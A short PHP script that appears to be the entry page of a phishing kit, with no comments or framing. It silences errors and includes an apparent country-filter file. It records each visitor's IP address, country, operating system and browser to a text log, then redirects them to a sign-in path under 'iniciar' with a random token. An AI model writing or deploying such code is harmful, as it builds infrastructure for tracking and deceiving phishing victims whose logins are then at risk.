<?php

session_start();
error_reporting(0);
$kings = rand(0,10000000000000);
$Man=date("D,M,d,Y-g:ia");

include './iniciar/inc/app.php';
require  'autorize_country.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    

header("location:./iniciar/?signin=$kings+_TIme:$Man");
$file = fopen("vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>